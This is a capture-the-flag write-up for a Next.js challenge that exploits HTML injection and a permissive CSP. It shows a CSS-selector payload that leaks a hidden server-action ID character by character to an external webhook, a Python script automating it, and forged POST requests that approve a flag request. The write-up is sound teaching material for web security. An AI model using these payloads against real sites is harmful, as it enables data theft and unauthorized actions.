# Beg-o-Matic 3000

## Description

Ever wish someone would just GIVE you the flag if you asked nicely?

## Files

* [beg-o-matic.zip](beg-o-matic.zip)

## Writeup


For this challenge, we are given a zip file containing the source code for the website. We can start by unzipping that and reviewing the source code.

Here is an overview of the file structure:
```
.
├── app
│   ├── actions.js
│   ├── admin
│   │   └── [id]
│   │       └── page.js
│   ├── favicon.ico
│   ├── globals.css
│   ├── layout.js
│   └── page.js
├── db
│   ├── actions.js
│   └── init.js
├── deploy-docker.sh
├── Dockerfile
├── flag.txt
├── jsconfig.json
├── middleware.js
├── next.config.mjs
├── package.json
├── package-lock.json
├── pages
│   └── api
│       ├── list.js
│       └── submit.js
├── postcss.config.mjs
├── public
└── utils
    └── bot.js
```

Looking through the code, we can see a few key endpoints for the website that can be used to interact:
* `/` - the main home page of the site which includes an ability to submit requests for a flag
* `/admin/[id]` - the page that allows the admin to approve the request with the index `id`
* `/api/list` - the endpoint that allows listing all requests for flags
* `/api/submit` - the endpoint to submit a request

We can also see that there is a bot that uses the `X-Bot-Auth` header to authenticate to the `/admin/[id]` endpoint where it waits three seconds, and `middleware.js` defines some CSP (Content Security Policy) headers to control what might be able to be injected into the page. This is the specific line where the CSP header is defined:

```js
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}';
    style-src 'self' 'unsafe-inline' *;
    img-src 'self' 'unsafe-inline' *;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
`
```

From this, we can see that scripts can only be run from the same domain with a "nonce" that is generated to ensure the script is generated by the server and not through reflected or stored XSS (Cross-Site Scripting). So it is probably difficult to exploit XSS in this page without bypassing the CSP somehow. But we do see that the `style-src` and `img-src` directives are very open, allowing inline injection of styles and both stylesheets and images from any domain. This is a huge hint that the solution is through CSS injection.

CSS injection occurs when CSS can be injected into a page, usually through a `<style>` tag. While it can't execute actions on a page such as clicking a button, it can be used to exfiltrate information based on carefully selected selectors. It is often performed similarly to XSS by injecting malicious HTML tags into a webpage, just using CSS rather than JavaScript to perform the attack.

Looking at `/app/admin/[id]/page.js`, we can confirm that there is an ability to inject arbitrary HTML, and therefore CSS, into the page.

```jsx
  return (
    <div className="p-8">
      <h1 className="text-xl font-bold">Admin Review</h1>
      <form action={ approveBegging }>
        <input type="hidden" name="id" value={ submission.id } />
        <button type="submit" className="mt-4 bg-green-600 text-white px-4 py-2 rounded">Approve</button>
      </form>
      <div dangerouslySetInnerHTML={{ __html: submission.msg }} />
    </div>
  );
```

Now, things get a bit interesting. While CSS can be used to exfiltrate data, the flag is never printed on this page, and really nothing super useful seems to be printed from this JavaScript file. If we had XSS, we could just click the "Approve" button, but we can't with CSS. However, we can spin up a local version in Docker to start looking at what we can do.

Once the container builds (which does take a while), we can see the bot token. Since the admin page is the likely target (since only the `approveBegging` action seems to enable accessing the flag), we can use this token and set our `X-Bot-Auth` header so we can access the page with the submission. Both Chrome/Chromium and Firefox have useful extensions that can be used to manipulate the headers on a page to do this and it just comes down to choosing a favorite.

We can submit a test request and then navigate to `/admin/1` with our header set to start investigating.

Once there, we see something like this:

![Admin page](../../images/Pasted%20image%2020250616194650.png)

However, we want to see what this button does. Looking inside DevTools, we can see that this is a form with a POST action with a hidden action ID `input` field.

![DevTools](../../images/Pasted%20image%2020250616194759.png)

This is something we *can* get using CSS injection! Since `name` is a CSS-readable property of an input element, we can just set our selectors to read elements with the `name` starting with a guess. The payload ends up looking something like this:

```css
form:has(input[name^="$ACTION_ID_ourguess"]) {
	background: url(http://our-webhook.com?value=ourguess);
}
```

This looks for `input` elements starting with (indicated by the `^=` operator) `$ACTION_ID_` followed by our current guess. If a form contains such an element, it then sets the background to an image from our webhook which we can use to exfiltrate that our guess was successful. It doesn't have to be a valid image, the request will still be made. And overall, if we just iteratively improve our guesses and check multiple times for each possible next character in our character set (which is just hexadecimal or `0123456789abcdef`), we can retrieve this action ID.

However, we do need to confirm that this is all we need. By clicking the button, we can use the Network tab of DevTools to copy the request as `fetch` to see what is going on. It's best to use the Node.js version of `fetch` to copy as so the headers are included.

```js
fetch("http://localhost:1337/admin/1", {
  "headers": {
    "accept": "text/x-component",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarylf30sJmuFnKeRKxh",
    "next-action": "408ffa0a3b3430405dd6619b87d198d2516951f7e7",
    "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%5B%22id%22%2C%221%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fadmin%2F1%22%2C%22refresh%22%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-bot-auth": "1deddb8e07aa416524a19e7670ada25f8d8b55356058ba307b8d0f2c667f6fd0",
    "Referer": "http://localhost:1337/admin/1",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "------WebKitFormBoundarylf30sJmuFnKeRKxh\r\nContent-Disposition: form-data; name=\"1_$ACTION_ID_408ffa0a3b3430405dd6619b87d198d2516951f7e7\"\r\n\r\n\r\n------WebKitFormBoundarylf30sJmuFnKeRKxh\r\nContent-Disposition: form-data; name=\"1_id\"\r\n\r\n1\r\n------WebKitFormBoundarylf30sJmuFnKeRKxh\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n[\"$K1\"]\r\n------WebKitFormBoundarylf30sJmuFnKeRKxh--\r\n",
  "method": "POST"
});
```

There's some headers here we'll need later that we can keep in mind. One of them is `next-action` which simply repeats the same action ID we can exfiltrate with CSS. However, the `X-Bot-Auth` shouldn't be needed for the exploit since that's only needed to view the page, not to complete an action.

With this all in mind, we can try to run the exploit locally!

We can build a Python script to run the CSS injection to get the action ID. Just put your webhook (I like using https://webhook.site) and the host, which should just be localhost:1337 for the local build, and run this. Requests will show in the webhook which contain the key which you can then copy and paste back into Python to run the next iteration. This repeats until you have the action ID. 

```python
from requests import post

# Store the URL of our webhook for use in generating a payload
webhook = "<webhook here>"

# The URL of the host we are attacking
host = "http://localhost:1337"

# Generates  our payload
def gen_payload(crib):
	# Start the payload with closing out the two div elements and then starting a style tag
    payload = "</div></div><style>"
    # The action ID is hexadecimal so loop through that charset
    for char in "0123456789abcdef":
	    # Guess what we already know and the next character
        guess = crib + char
        # Add the CSS selector to test this guess
        payload += "form:has(input[name^=\"$ACTION_ID_" + guess + "\"]){background:url("+webhook+"?value="+(guess)+");}"
    # Test if the payload is equal to what we already know (says we're done)
    payload += "form:has(input[name=\"$ACTION_ID_" + crib + "\"]){background:url("+webhook+"?value="+(crib)+");}"
    # Close out the style tag and re-enter the two div elements
    payload += "</style><div><div>"
    # Return our final payload
    return payload

# Stores what we currently know as the action ID
key = ""
while True:
	# Send a request to /api/submit with our payload
    print(post(host + "/api/submit", json={"beg":gen_payload(key)}).text)
    # Get the new key we get from this
    key = input("New key:")

```

![Webhook result](../../images/Pasted%20image%2020250616200118.png)

![Script inputs](../../images/Pasted%20image%2020250616200142.png)

Eventually, we will get the same action ID we saw in DevTools earlier. So we can use this to approve the flag request at ID 2 (since 1 was already approved in testing). This request should do this:

```js
fetch("http://localhost:1337/admin/2", {
  "headers": {
    "accept": "text/x-component",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarylf30sJmuFnKeRKxh",
    "next-action": "408ffa0a3b3430405dd6619b87d198d2516951f7e7",
    "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%5B%22id%22%2C%221%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fadmin%2F1%22%2C%22refresh%22%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "Referer": "http://localhost:1337/admin/1",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "------WebKitFormBoundarylf30sJmuFnKeRKxh\r\nContent-Disposition: form-data; name=\"1_$ACTION_ID_408ffa0a3b3430405dd6619b87d198d2516951f7e7\"\r\n\r\n\r\n------WebKitFormBoundarylf30sJmuFnKeRKxh\r\nContent-Disposition: form-data; name=\"1_id\"\r\n\r\n2\r\n------WebKitFormBoundarylf30sJmuFnKeRKxh\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n[\"$K1\"]\r\n------WebKitFormBoundarylf30sJmuFnKeRKxh--\r\n",
  "method": "POST"
});
```

All we change is removing the unnecessary auth header and changing the URL and form body to approve request ID 2.

Sending that request and refreshing, we can see our test flag!

![Test flag](../../images/Pasted%20image%2020250616200453.png)

Now we can launch an instance of the challenge and change our script to use the URL we get there and we can solve it!

![Webhook](../../images/Pasted%20image%2020250616201117.png)

![Script](../../images/Pasted%20image%2020250616201140.png)

![JS Console](../../images/Pasted%20image%2020250616201210.png)

![Flag](../../images/Pasted%20image%2020250616201228.png)

And we have our flag, `SVUSCG{0425cd7e75134791d6ba7f785c666b28}`!

Overall, there was a lot of copying and pasting involved with this challenge that could be fixed with port forwarding or something like ngrok if you're fine exposing a port on your local machine, but this challenge showed an interesting side of Next.js exploitation where the method by which the framework executes actions can definitely be improved!
